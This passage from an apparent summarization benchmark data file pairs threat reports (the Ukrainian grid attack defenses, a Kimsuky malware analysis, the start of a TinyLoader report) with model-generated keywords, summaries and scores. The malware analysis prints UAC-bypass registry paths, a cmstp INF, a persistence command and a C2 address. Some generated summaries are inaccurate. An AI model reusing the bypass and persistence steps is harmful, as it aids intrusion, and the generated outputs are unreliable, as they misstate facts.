restoration plans for attacks with the potential to go deeper into the ICS and could result in damaged equipment. Identify new connections leaving the environment and previously unseen encrypted communications. Network Security Monitoring (NSM) is a great active defense method of detecting exfiltration and ending an adversary\u2019s attack path before it disrupts the ICS. Mitigation guidance based on the attacker approach used in this campaign recommends using two-factor authentication with user tokens to strengthen authentication. The Next Attack Attackers may begin looking for existing point-to-point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled. The immediate mitigation recommendation is to implement trusted jump host or intermediary systems with Network Access Control (NAC) enforcement. Additionally, a VPN configuration approach that disables split tunneling should be enforced. Opportunities to Disrupt: Defenders are reminded that having remote access through a trusted connection is advantageous for an attacker. Begin by asking why each trusted communication path exists, evaluate the risk, and eliminate each path that does not have an identified need that outweighs the risk of having an attack path. For those communication paths that must remain, consider implementing time of use access for users. Implement the ability to disconnect these paths in an automated way after a defined period of time after access in granted, and a method to disconnect manually if needed. From a passive defense perspective, force choke points in the environment by ensuring that the remote VPNs enter into the environment through a dedicated remote access DMZ. This ensures that traffic and connections can be monitored by active defenders using techniques such as network security monitoring to identify abnormalities in duration of connections, number of connections, and time the connections occur. Workstation Remote Access Based on the details provided, the adversaries used the organizations\u2019 workstations remotely (while the attacker was physically remote, logically they were local to the host) to conduct Stage 2 of the attack. Mitigation recommendations focus on disabling remote access at the host and at the perimeter firewall.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201613Defense Lessons Learned \u2013 Passive and Active DefensesThe Next Attack Adversaries may modify attack approaches to load additional remote access tools, utilize remote shell capabilities, and tunnel communications over authorized perimeter firewall communications. In response to this modified attack approach, mitigation efforts should focus on host based application aware firewalls, application whitelisting, and configuration management efforts to identify changes in the operation of an asset. Application whitelisting, if installed on the operator HMI to prevent installation of unauthorized remote access software, will not aid in the prevention of authorized software. Also, keep in mind that specific control system vendors may not approve of the whitelisting software. Opportunities to Disrupt As a defender prepares for a cyber asset within a trusted environment that may be compromised and remotely controlled, they must consider approaches to quickly move to a conservative operations environment where the ability to issue control signals from untrusted assets is paused. Proper architecture would dictate the ability to segment or disable activities such as remote connections, and unnecessary outbound communications, while conducting active defense mechanisms; such as incident response prior to restoring operational control capabilities to known good assets. Control and Operate As the attackers utilized the operator HMI\u2019s, they operated numerous sites under the control of the dispatcher. Mitigation approaches for this specific action would focus on application level logic requiring confirmation from the operator, or implement Area of Responsibility (AoR) limitations that only allow an operator to effect certain components of a system. For example: If an entity implemented AoR on one operator workstation that provided east breaker control, and a second operator workstation that provided West breaker control, then an adversary positioned on one workstation would be limited to the AoR allowed on that specific workstation. Some vendor systems allow for Username determined AoR, Workstation determined AoR, and/or an intersection model that combines username and workstation identifier in AoR authorization. There are variations amongst vendor systems in how authentication is handled within the local workstation, directory, or at the application. The Next Attack When an attacker identifies a workstation with application security controls in place that limits their capabilities, they may modify their attack to control the system directly by issuing or injecting control commands. Mitigation strategies for this approach would focus on communication path authentication or protocol authentication that would require commands to be issued from an authorized asset. Monitoring communication sessions between hosts can lead to early detection and investigation of suspicious communications. Opportunities to Disrupt Preparing for adversarial utilization of cyber assets, or communication paths to control and operate elements of an ICS system, requires system defenders to develop a response approach that eliminates entire sections of cyber asset elements and networks in an effort to inhibit automated control and activate manual operations only. As adversaries learn the environment, they may issue test commands and interact with the SCADA environment without the intention to disrupt it. For mitigation purposes, defenders must talk to operators and ask about abnormal occurrences, and from a passive defense perspective, ensure that logs are collected not only from the host but also from the SCADA applications. Additionally, implement a log aggregation architecture that replicates log files from assets into a log correlation system. Finally, have active defenders routinely review these logs in conjunction with other monitoring activity throughout the ICS to identify abnormalities.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201614Defense Lessons Learned \u2013 Passive and Active DefensesTools and Technology impacts The attackers used multiple approaches to impact communication tools, operator technology for restoration efforts, and facility infrastructure essential to many operator activities. Therefore, mitigation recommendations are varied. Items to focus on are:\uf0b7 Establishing filtering and response capabilities at telecom providers to activate during an ongoing TDoSattack\uf0b7 Disable remote management of field devices when they are not required.\uf0b7 Disconnect building control infrastructure systems from the ICS network.\uf0b7 Consider the number of spares required for embedded systems to regain required communication orcontrol/protection.The Next Attack A subsequent attack may progress from resource consumption to a more direct communication path outage that affects communication capabilities. To mitigate this approach, defenders need to establish alternate communications infrastructure for essential service capabilities. After an attacker identifies increased security requirements for field device management, they may attempt to establish direct access to a field device through a local asset with connectivity or physical presence at the site for direct firmware manipulation. Mitigation strategies for this attack approach focus on electronic and physical access controls and the development of a rapid response capability during an attack or incident. Opportunities to Disrupt A determined adversary can impact remote assets either electronically or physically. A defender should develop strong recovery and restoration approaches to replace mission-critical cyber asset components. One option is to rely on inventory and mutual aid assistance from trusted peer organizations and/or suppliers. In cases where specific assets are not immediately recoverable, it is necessary to develop the ability to operate the larger system with operational islands that can be recovered in a timely manner. Defenders should have access to and visibility of the ICSs to be able to identify abnormal behavior around field device interaction. For example, uploading firmware outside of a scheduled downtime should be quickly observable. Firmware modifications over the network cause spikes in network traffic that active defenders should be consistently looking for. See Figure 10 for an example of a malicious firmware update to an industrial network switch. Even without knowing the baseline of normal activity, which defenders should have, it can be trivial to spot firmware updates in network data.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201615Defense Lessons Learned \u2013 Passive and Active DefensesFigure 10: Sample Network I/O Data from a Malicious Firmware Update to an Industrial Ethernet Switch37Respond and Restore The cyber attacks performed against three Ukrainian oblenergos were well planned and highly coordinated. The attacks consisted of several major elements with both enabling and supporting attack segments. The attackers were remote and interacted with multiple locations within each of their targets to include central and regional facilities. Distribution utilities traditionally have both central business and engineering office(s) and a number of branch facilities used to support line crew, meter reading, bill payment, and distributed supervisory control operations. Certain types of cyber attacks designed to maliciously take over and operate a SCADA DMS may be best performed in a distributed fashion at the lowest or most direct level (from a local dispatch and SCADA server out to the substations that are being monitored and controlled). Preparing for a high-tempo, multifaceted attack is not easy and it requires careful plan review, testing, integrated defense, and operations exercises. Rehearsing steps to more quickly sever or prevent remote access, to safely separate the ICSs from connected networks, or to contain and isolate suspicious hosts is critical. The Next Attack The next attack may purposefully differ in its approach to throw off or defeat the defender\u2019s plans and expectations. It is critical that defenders exercise and train against different scenarios and be aware that attackers are co-adaptive and creative. It is vital to develop capabilities with flexibility in mind. Opportunities to Disrupt/Restore Operations personnel must be involved in planning for restoration from a successful Stage 2 ICS attack. Concepts to consider from an electric operations and engineering perspective include the following and are graphically depicted in Figure 11:\uf0b7 Cyber contingency analysis: Continuous analysis and preparing the system for the next event.\uf0b7 Cyber failure planning: Modeling and testing cyber system response to network and asset outages.\uf0b7 Cyber conservative operations: Intentionally eliminating planned and unplanned changes as well asstopping any potentially impactful processes.37 For a good discussion on exploits and malicious firmware updates for industrial ethernet switches see the research by Eireann Leverett, Colin Cassidy, and Robert M. Lee in the DEFCON presentation \u201cSwitches Get Stitches\u201d here: url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201616Defense Lessons Learned \u2013 Passive and Active Defenses\uf0b7 Cyber load shed: Eliminating unnecessary network segments, communications, and cyber assets that arenot operationally necessary.\uf0b7 Cyber Root Cause Analysis (RCA) : RCA forensics to determine how an impactful event occurred andensure it is contained.\uf0b7 Cyber Blackstart: Cyber asset base configurations and bare metal build capability to restore the cybersystem to a critical service state.\uf0b7 Cyber mutual aid: Ability to utilize information sharing and analysis centers (ISACs), peer utilities, law enforcement and intelligence agencies, as well as contractors and vendors to respond to large-scale events.Figure 11: Summary of the opportunities to disrupt the attackE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201617RecommendationsArchitecture Recommendations:\uf0b7 Properly segment networks from each other.\uf0b7 Ensure logging is enabled on devices that support it, including both IT and Operational Technology (OT)assets.\uf0b7 Ensure that network architecture, such as switches, are managed and have the ability to capture datafrom the environment to support Passive and Active Defense mechanisms.\uf0b7 Make backups of critical software installers and include an MD5 and SHA256 digital hash of theinstallers.\uf0b7 Collect and vault backup project files from the network.\uf0b7 Test the tools and technologies that passive and active defense mechanisms will need (such as digitalimaging software) on the environment to ensure that it will not negatively impact systems.\uf0b7 Prioritize and patch known vulnerabilities based on the most critical assets in the organization.\uf0b7Limit remote connections only to personnel that need them. When personnel need remote access, ensure that if they do not need control that they do not have access to control elements. Use two-form authentication on the remote connections.\uf0b7 Consider use of a system event monitoring system, configured and monitored specifically for high-valueICS/SCADA systems.Passive Defense Recommendations:\uf0b7 Application whitelisting can help limit adversary initial infection vectors and should be used when nottoo invasive to the ICSs.\uf0b7 DMZs and properly tuned firewalls between network segments will give visibility into the environmentand allow defenders the time required to identify intrusions.\uf0b7 Establish a central logging and data aggregation point to allow forensic evidence to be collected andmade available to defenders.\uf0b7Implement alarm package priorities for abnormal cyber events within the control system.\uf0b7 Enforce a password reset policy in the event of a compromise especially for VPNs and administrativeaccounts.\uf0b7 Utilize up-to-date antivirus or endpoint security technologies to allow for the denial of known malware.\uf0b7 Configure an intrusion detection system so that rules can be quickly deployed to search for intruders.Active Defense Recommendations:\uf0b7 Train defenders to hunt for odd communications leaving the networked environment such as new IPcommunications.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201618Recommendations\uf0b7 Perform network security monitoring to continuously search through the networked environment forabnormalities.\uf0b7 Plan and train to incident response plans that incorporate both the IT and OT network personnel.\uf0b7 Consider active defense models for security operations such as the active cyber defense cycle.\uf0b7 Ensure that personnel performing analysis have access to technologies such as sandboxes to quicklyanalyze incoming phishing emails or odd files and extract indicators of compromise (IOCs) to search for infected systems.\uf0b7 Use backup and recovery tools to take digital images from a few of the systems in the supervisoryenvironment such as HMIs and data historian systems every 6-12 months. This will allow a baseline of activity to be built and make the images available for scanning with new IOCs such as new YARA rules on emerging threats.\uf0b7 Train defenders on using tools such as YARA to scan digital images and evidence collected from theenvironment but do not perform the scans in the production environment itself.Good architecture and passive defense practices build a defensible ICS; active defense processes establish a defended ICS environment. Countering flexible and persistent human adversaries requires properly trained and equipped human defenders.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201619Implications and ConclusionImplications for Defenders The remote cyber attacks directed against Ukraine\u2019s electricity infrastructure were bold and successful. The cyber operation was highly synchronized and the adversary was willing to maliciously operate a SCADA system to cause power outages, followed by destructive attacks to disable SCADA and communications to the field. The destructive element is the first time the world has seen this type of attack against OT systems in a nation\u2019s critical infrastructure. This is an escalation from past destructive attacks that impacted general-purpose computers and servers (e.g., Saudi Aramco, RasGas, Sands Casino, and Sony Pictures). Several lines were crossed in the conduct of these attacks as the targets can be described as solely civilian infrastructure. Historic attacks, such as Stuxnet, which included destruction of equipment in the OT environment, could be argued as being surgically targeted against a military target. Infrastructure defenders must be ready to confront highly targeted and directed attacks that include their own ICSs being used against them, combined with amplifying attacks to deny communication infrastructure and future use of their ICSs. The elements analyzed in the attack indicated that there was a specific sequence to the misuse of the ICSs, including preventing further defender use of the ICSs to restore the system. This means that the attacker \u201cburned the bridges\u201d behind them by destroying equipment and wiping devices to prevent automated recovery of the system. The attacks highlight the need to develop active cyber defenses, capable and well-exercised incident response plans, and resilient operations plans to survive a sophisticated attack and restore the system. Nothing about the attack in Ukraine was inherently specific to Ukrainian infrastructure. The impact of a similar attack may be different in other nations, but the attack methodology, Tactics, Techniques, and Procedures (TTPs) observed are employable in infrastructures around the world. We have identified five themes for defenders to focus on as they consider what this attack means for their As defenders of ICSs, consider the sequence of events taken by the adversary in the months leading up to December 23, 2015 when this cyber operation targeting Ukrainian electricity infrastructure was planned and developed. The operation relied upon intrusions that appear to have come from a broader access campaign conducted in the spring of 2015. In a prolonged attack campaign, there are likely numerous opportunities to detect and defend the targeted system. The two-stage ICS cyber kill chain helps note that in an ICS environment, there is an increased window for the detection and identification of the most concerning attack types. The cyber attacks were conducted within minutes of each other against three oblenergos, resulting in power outages affecting approximately 225,000 customers for a few hours. While the total number of customers across three service territories does not add up to a significant number of customers or load across Ukraine, there may be significance in target selection or specific loads. One critical element of this particular attack was its coordinated nature affecting three target entities and the thoroughness of the adversary sequence of events in achieving their goals. Important opportunities for defenders to disrupt the adversary\u2019s sequence of events were The cyber attacks were mislabeled as solely linked to BlackEnergy 3 and KillDisk. BlackEnergy 3 was simply a toolE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201620Implications and Conclusionused in Stage 1 of the attacks and KillDisk was an amplifying tool used in Stage 2 of the attacks. BlackEnergy 3 malware was used to gain initial footholds into a multitude of organizations within Ukraine and not just the three impacted oblenergos. It is unknown if the adversary had planned to use this access campaign to enable their operation or if achieving access was the motivation leading to the development of a concept to attack the Excessive focus on the specific malware used in this attack places defenders into a mindset in which they are simply waiting for guidance on the specific attack components so they can eliminate them. This attack could have been enabled by a variety of approaches to gain access and utilize existing assets within a target environment. Regardless of the initial attack vector, the ICS tools and environment were ultimately used to achieve the desired effect, not the BlackEnergy 3 malware. The attack concept had to be able to work across multiple SCADA DMS implementations and target common susceptible elements, such as storage overwrites for Windows-based operating system workstations and servers. The attackers likely developed destructive firmware overwrite techniques after discovering accessible embedded systems. There was likely a significant amount of unobservable adversarial testing performed prior to introducing the attack into the environment. Many capabilities were demonstrated throughout this attack, and they all provide specific lessons learned for defenders to take action on. Information sharing is key in the identification of a coordinated attack and directing appropriate response actions. Within the Ukraine, an organization with the ability to enable appropriate information sharing and provide incident response guidance should be pursued. In the United States and other countries with established information sharing mechanisms, such as ISACs (Information Sharing and Analysis Centers), the focus should be on maintaining and improving the information provided by asset owners and operators. This increased data sharing will enhance situation awareness within the sector, which will in turn lead to earlier attack detection and facilitate incident response. In many ways, the Ukrainian oblenergos and their staff, as well as the involved Ukrainian government members deserve congratulations. This attack was a world first in many ways, and the Ukrainian response was impressive with all aspects considered. As the investigation and analysis of technical data continues and more information regarding this attack surfaces, the authors of this DUC will update this report where appropriate in an effort to maintain the most accurate and beneficial guidance document possible for ICS defenders. The E-ISAC will continue to provide credible reporting and guidance as well.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201621Appendix Information EvaluationCredibility: 538 The claims by the Ukrainian government that outages in the service territory of the targeted electricity companies were caused by a series of cyber attacks have been confirmed. The claim was originally met with private skepticism by the SANS ICS team as ICS organizations frequently have reliability issues and incorrectly blame cyber mechanisms such as malware found on the network that is unrelated to the outage. Early reporting on incidents is often rushed and stressful which leads to inaccurate claims. However, in the Ukrainian case, there is a large amount of evidence available; including malware samples, interviews with operators present during the incident, and confirmation by multiple private companies involved in the incident. Lastly, the U.S. government has since also confirmed the attacks due to their own investigation. The most recent report released from DHS ICS-CERT39 cites direct interviews with \u201coperations and information technology staff and leadership at six Ukrainian organizations with first-hand experience of the event.\u201d Based on the information provided in the report,40 the U.S. delegation interviewed and considered information from the three impacted organizations as well as others. The format of the interviews, and asset owner and operator discussions, indicated that \u201cthe team was not able to independently review technical evidence of the cyber- attack. However, a significant number of independent reports from the team\u2019s interviews as well as documentary findings corroborate the events\u2026\u201d.41 However, a large amount of technical information was made available to the larger community including indicators of compromise, malware samples, technical information about the ICS itself and its components, and some samples of logs from the SCADA environment.42 The majority of sources to date have relied upon initial attempts by Ukrainian power entities to inform customers about the cause of the outage and sources derived from interviews with impacted entities. The DHS report does not attempt to assign attacker attribution and neither will this DUC. Amount of Technical Information Available: 443 A score of 4 has been assigned for the technical information available due to the fact that malware samples, observable ICS impacts, technical indicators of compromise, and first hand interviews were available. The investigation also included a joint working group between the Ukrainian government, impacted oblenergos, and U.S. government representatives starting on January 18, 2016.44 This amount of information was sufficient to confirm the attacks. However, it should be noted that there may be pieces of information missing due to the lack of visibility in various parts of the ICS network. As an example, packet captures from the network during the attack and field38 Credibility of the information is rated in a scale from [0] Cannot be determined, [1] Improbable, [2] Doubtful, [3] Possibly true, [4] Probably true, [5] Confirmed 39 url 40 SANS ICS team members have been able to view technical data in both public and non\u2010government private channels to confirm the existence of forensic data and the core components of the analysis based off of the data. 41 url 42 It should be noted that many in the community would like access to internal forensic logs of the impacted oblenergos. This is an understandable request but it is extremely rare for impacted organizations to make such information publicly available. SANS ICS team members have been able to view technical data in both public and non-government private channels to confirm the existence of forensic data and the core components of the analysis based off of the data. 43 Amount of Technical Information Available is an analyst\u2019s evaluation and description of the details available to deconstruct the attack provided with a rating scale from [0] No specifics, [1] high-level summary only, [2] Some details, [3] Many details, [4] Extensive details, [5] Comprehensive details with supporting evidence 44 url app1?art id=245086886&cat id=35109E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201622Appendix Information Evaluationdevice logging were not available. With this information even more about the technical minutia of the attack would be available. The amount of information available as well as the willingness by the impacted oblenergos and Ukrainian government to share that information publicly was the most seen to date for a confirmed intentional cyber attack that impacted the operations of an ICS. When considering the technical information provided, the authors of this DUC have considered the larger public reporting of electricity customer outages within Ukraine as a component of the validation and evidence necessary to demonstrate the attacker effects to the electricity system. The official public alert by DHS corroborates prior reporting and is based on interviews and information exchanged with the impacted organizations.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201623 ", "generated_text": "the document; a joint report; traffic light protocol; Traffic Light Protocol; White; the cyber attack; January 2015; the Ukrainian Kyivoblenergo; customers; service outages; a third party; the SCADA system; the attacker; a foreign attacker; the SCADA system; operators; the attacker; the attack; the Russian security services; Russian; the SCADA; the outages; 80,000; 225,000; the Ukrainian government; Russian security services; the threat; the attack; techniques; procedures; tactics; mitigation; Recommendations; the ICS community; prevention.", "ref_text": "<START-1>In December 2015, cyber attacks caused power outages for 225,000 customers across 3 distribution utilities in Ukraine. The attacks involved spear phishing and custom malware including BlackEnergy3, KillDisk, and malicious serial-to-ethernet firmware. The attacks followed the ICS Cyber Kill Chain, first gaining access to IT networks and then attacking ICS components to cause effects. The attackers conducted long-term reconnaissance, stole credentials, and utilized VPNs to pivot to ICS networks. The core attack involved using operator HMIs to open breakers, wiping SCADA systems with KillDisk, and blowing up communication bridges. The attackers also launched telephone denial-of-service attacks on call centers. Recommended defensive mitigation strategies involve improving architecture, logging, segmentation, monitoring, response planning, and information sharing. Future attacks may vary tactics so defense must be flexible. The attacks crossed lines by publicly targeting civilian critical infrastructure. The implications are that defenders must prepare for highly targeted synchronized attacks that burn bridges. Information sharing and cooperation were key. The response by Ukraine was impressive but the attack could succeed in many countries. Infrastructure defenders globally must learn from this case. <END-1>", "t5/keyword/hint_hit_precision": 0.14285714285714285, "t5/word/hint_hit_recall": 0.03389830508474576, "gpt3/lexical/rouge_rouge1": 0.363036303630363, "gpt3/lexical/rouge_rouge2": 0.07973421926910298, "gpt3/lexical/rouge_rougeL": 0.1782178217821782, "gpt3/lexical/rouge_rougeLsum": 0.1782178217821782, "gpt3_generated_text": ["The document, released under the Traffic Light Protocol: White, is a joint report analyzing the cyber attack on the Ukrainian power grid in January 2015. The attack, targeting the Ukrainian Kyivoblenergo, resulted in service outages for customers due to a third party gaining illegal access to the SCADA system. A foreign attacker remotely controlled the system, causing multiple substations to be disconnected and forcing operators to switch to manual mode. The outages affected approximately 225,000 customers across various areas. The Ukrainian government attributed the attack to Russian security services. The report provides insights into the attacker's tactics, techniques, and procedures, as well as lessons learned and recommendations for the ICS community to prevent similar attacks in the future."]}, {"split_name": "val", "sample_id": "val_42", "prompt_text": "Extract the keywords: Piece of dragon's scalessfkino-tistory-com.translate.goog/80TL;DRDecember 30, 2021Attacks using the golddragon/braveprince cluster of the kimsuky (aka Thallium) group continue Recently, a routine to encode API names has been added to the golddragon/braveprince cluster malware. Quasar-based malware, an open source RAT, was discovered by searching for additional intelligence based on stringsoutline In fact, the golddragon/braveprince clusters (personally, I call them daumrat) were thinking of posting them all around mid- 2021 While I was spending time in the lost arc, the cisco talos team organized it well and made it public. It's sweet, but thanks to you, I have no use for it.So, in this post, we will briefly discuss the braveprince, password stealer malware, and Quarsar RAT-based .net malware with name en/decoding routine added through intelligence search.Case 1. Golddragon/braveprince malware with API Name En/Decoding logic addedWhen the Run function is executed through rundll.exe, it is a very typical braveprince cluster that steals information and creates svchost.exe and iexplorer.exe to steal information via daum mail. (Personally, I call it daumrat) recently discovered golddragon/braveprince In the malware, functions were the same as before, but we found a sample with added logic to encrypt/decrypt DLL and API names.WTF_10003CD0 functionget encoded dll name & api name Inside the file, there is an api_name_table containing the encoded DLL name and the API included in the DLL. Get the encoded DLL name by comparing the encoded api names in this table.1/14decode string The encoded DLL and API names received as arguments are decoded by the following routine.1. Get the index of the character position to be decrypted in the key table 2. Calculate the position index value with a specific formula (( idx - 0x16) & 0x3F) 3. Replace the encoded string using the calculated value as an index in the key tableThe decryption logic is implemented as follows.def decryptor(enc_str):key_table = 'zcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr-JM2G7QAxpnmEVbqP5TuB9Ds6fFt' dec_str = '' for enc_chr in enc_str: idx = key_table.index(ord(enc_chr)) dec_str += chr(key_table[ (idx - 0x16) & 0x3F ]) return dec_str2/14The string substitution key table used by this malware is also found in other malware used by this group. (link: url PebbleDash.pdf )Case 2. Information StealerReport published by AhnlabIn a stranger intelligence search, I found a sample with a familiar scent. It is a sample that has already been analyzed and reported by talos, so let's briefly look at the functions. (link: url )%AppData%qwer.txt file does not exist if it does not exist Create %AppData%information folder (WORKING_PATH) Save system information in %AppData%Information foldercmd.exe /c ipconfig/all >> [WORKING_PATH]\\netinfo.dat & arp -a >> [WORKING_PATH]\\netinfo.dat cmd.exe /c systeminfo >> [WORKING_PATH]\\sysinfo.dat cmd.exe /c tasklist >> [WORKING_PATH]\\procinfo.dat [WORKING_PATH]\\filelist.datAfter the svchost.exe process is created, the data in the resource area is decrypted and then injectedIt is a malicious code that modified nirsoft's webpassview program to steal user information stored in the browser and save it as a file.[WORKING_PATH]\\aaweb.txt3/14Stealing system informationStealing account information stored in web browsersThis malicious code does not have a routine to transmit the collected information to the outside and does not run without the qwer.txt file, so it appears to be one of the system information collection modules executed by other malicious codes.Case 3. .Net malware based on Quasar RATCase 1 While performing an intelligence search with the found key value and encoded API name, I found a dropper running Quasar RAT. The resource structure of the file is quite complex, so I expressed it as a picture4/14The operation method of the malicious code is as follows.malware resource dataIf your Windows version is 10Drop & Execute Privilege Elevation SW (TEXT114)If you have high privileges and WinDefender is runningDefender Control SW & Execution (TEXT116)Main Malicious Behavior (TEXT115)Drop file with C2 information5/14elevation of privilegeMalware main logicThe malicious code decrypts the resource file (TEXT116), maps the file to memory, and calls the Export function Reg for privilege elevation.factor Privilege ElevationS/Wfile/registry pathOnecomputerdefaults.exe HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command2345sdclt.execmstp.exeHKCU\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command%AppData\\Microsoft\\windows\\seting.iniWSReset.exeHKCU\\\\Software\\\\Classes\\\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\\\Shell\\\\open\\\\commandslui.exeHKCU\\\\Software\\\\Classes\\\\Launcher.SystemSettings\\\\shell\\\\open\\\\command6/14Privilege Elevation S/W[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall]CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection] [MALPATH]\\malware.dll,Run taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection] \"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", ShortSvcName=\"WinPwnageVPN\"Turn off winDefenderSearch \"sMpEng\" string among running processes to check whether Defender is running, and if it is running, drop the file (TEXT114) in the resource area and run it with the /D option to turn off Defender.Path: %PROGRAMFILES%\\Microsfot\\ File name: /[cetuikgbms]{6}.exe7/14win defender controlMalware installationThe final malicious code, Quasar RAT, and the encrypted C2 file are dropped to a fixed folder.Encrypted C2 (BIN101): %AppData%\\Microsoft\\Office\\MsWord16.pip Quasar RAT (BIN102): %AppData%\\Microsoft\\Office\\StaticCache.datThe loader running Quasar RAT creates a random folder in %AppData%\\Microsoft\\, drops it to a random name, and runs it.Installation path: %AppData%\\Microsoft\\ [pubs, Common, Defender, Protect, Vault] File name: [svchost, sihost, spoolsv, taskhostw, RuntimeBroker].exe Execution argument: -startAutorun Registration (Persistence)Attempts to register the scheduler and register the registry (if Windefender is not running) to secure the continuity of the malicious code.8/14autorun nameWindowsAutoUpdate CloudUpdateschtasks.exe \"/create /tn \\\"WindowsAutoUpdate\\\" /tr \\\"C:\\\\Users\\\\anon\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\svchost.exe -start\\\" /sc DAILY /mo 1 /f\"Registry Path: Path: HKLM\\SoftWare\\Microsoft\\Windows\\CurrentVersion\\RunRAT LoaderRAT Loader is a .NET-based loader program named teracom or RuntimeBroker that reads Quasar-based malware, decodes it, and executes it. PDB information exists in the loaded executable file.G:\\SRC\\!Spy\\!LoadAssembly\\!teracom\\teracom\\obj\\Release\\teracom.pdb G:\\SRC\\!Spy\\taskhost\\taskhost\\obj\\Release\\RuntimeBroker.pdbteracom/runtimebroker info9/14Malware based on Quasar RATRAT loaderThe StaticCache.dat file that operates in memory is a Quasar RAT-based malware with a package name of RMSSVC. The overall function is the same as Quasar RAT, so only some settings, decryption logic, and C2 address loading method will be reviewed. (link: url )10/14RAT Package11/14Decrypt the encrypted C2 and AES-encrypted MsWord16.pip files in the Config file and set them to C2Setting information to be used for malicious behaviorhttps: //blog.daum [.]net/casalesmedia/pages/category 2. 159 (0x9F) XORC2 File Decryption Logic (AES)def aes_dec(enc_str):enc_str = base64.b64decode(enc_str) key = base64.b64decode(\"IuYp5htzIKk1wqlMrcwzSg==\") iv = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" decrypt = AES.new(key, AES.MODE_CBC,IV= iv) dec_str = decrypt.decrypt(enc_str) print(dec_str)conclusionI'm just sorry for wasting your time by bringing all the finished rice cakes. But I wrote it with the hope that it might be helpful to someone. And I probably won't be posting any more tracking or analysis posts about these friends after this one. (The reason will be written later along with the current situation on personal SNS.)I end this article by sending a review to all malware/threat analysts who are struggling day and night to identify and block threats.Goodbye 2020! And Happy New year!!IOCCase 1. API Name En / Decoding logic is added golddragon / braveprince malware 237DEBA138355BFB448E74BFB68FC868F4807B24D68715A6D47E348FC0CF925713/14Case 2. the Information Stealer SHA256: 5E3907E9E2ED8FF12BB4E96B52401D871526C5ED502D2149DD4F680DA4925590Case 3. .Net based malware on Quasar RAT sha1: E8BEF41ED7D0704D9206880EE0F30B5ECF30F204 SHA256: 0CF7E1268E8652D841B7BDA784707E445B9CDC2A46FFB375C8F239CB4C551F7314/14 ", "generated_text": "espionage; the golddragon/braveprince cluster; kimsuky; Thallium; February; Information Stealer; Quarsar RAT; a routine; API names; HTTP; Run; Run; information; svchost.exe; iexplorer.exe; the code; the decryption logic; the password stealer malware; the Run function; the tools; decryption; ni; the encryption; the RAT; a routine; API names; code en; espionage; mining; a registry key; a dll; the dll name; the API name; the dll name.", "ref_text": "<START-1>The document analyzes recent activity by the North Korean threat actor group Kimsuky, also known as Golddragon or Braveprince. It first looks at malware from the Golddragon/Braveprince cluster that steals information and communicates with a command and control server. This malware now includes a routine to encode API names to evade detection. The second sample is an information stealer that gathers system data, account credentials from browsers, and exfiltrates the information. This appears to be a module used by other Kimsuky malware. The third sample leverages the open source Quasar RAT. It uses privilege escalation techniques to disable Windows Defender before dropping the RAT payload. This payload communicates with C2 servers and has code similarities to previous Kimsuky malware. In summary, the analysis examines three new malware samples attributed to the Kimsuky group based on code reuse, tactics, and other similarities to known activity. It highlights the ongoing evolution of their malware to gather data from compromised systems and communicate with command and control infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.20588235294117646, "t5/word/hint_hit_recall": 0.07878787878787878, "gpt3/lexical/rouge_rouge1": 0.4890510948905109, "gpt3/lexical/rouge_rouge2": 0.14705882352941174, "gpt3/lexical/rouge_rougeL": 0.22627737226277372, "gpt3/lexical/rouge_rougeLsum": 0.22627737226277372, "gpt3_generated_text": ["The article discusses recent attacks using the golddragon/braveprince cluster associated with the kimsuky group, also known as Thallium. The malware includes a routine to encode API names, with a focus on the Quasar-based RAT malware. The golddragon/braveprince malware steals information by creating svchost.exe and iexplorer.exe processes and encrypting DLL and API names. The decryption logic involves a specific formula to decrypt encoded strings. Additionally, an information stealer malware is highlighted, which collects system information and browser credentials without transmitting the data externally. The article provides insights into the tactics used by cyber espionage groups and the tools they employ for their malicious activities."]}, {"split_name": "val", "sample_id": "val_43", "prompt_text": "Extract the keywords: A TrendLabs ReportBackdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsTrendLabs Security Intelligence Blog Jay Yaneza and Erika Mendoza Trend Micro Cyber Safety Solutions Team May 2016Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsContents Introduction 1 TinyLoader\u2014the not-so-missing link? 1 Method of operations: testing first before mass deployment 2 Ties that bind: the TinyPOS-AbaddonPOS connection 6 Widespread distribution 10 Challenges and Recommendations 11 Appendix 13TREND MICRO LEGAL DISCLAIMERThe information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice. The information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend Micro reserves the right to modify the contents of this document at any time without prior notice.Translations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise related to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes.Although Trend Micro uses 